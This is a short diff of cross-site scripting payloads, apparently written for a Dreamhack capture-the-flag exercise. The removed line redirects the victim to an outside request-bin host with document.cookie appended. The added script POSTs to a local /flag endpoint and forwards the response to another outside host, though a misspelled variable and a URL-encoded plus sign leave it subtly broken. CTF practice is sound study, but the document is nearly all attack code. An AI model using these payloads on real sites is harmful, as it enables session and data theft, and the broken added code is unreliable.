@@ -1,1 +1,13 @@
-<script>location.href='https://emihjgl.request.dreamhack.games/'+document.cookie</script>
+<script>
+const postData = {
+  'admin': 'zzlol'
+};
+
+const options = {
+  method: 'POST',
+  body: postData
+};
+
+fetch('http://localhost:8000/flag', options)
+  .then(response => location='https://uitfdds.request.dreamhack.games/'%2breponse)
+</script>
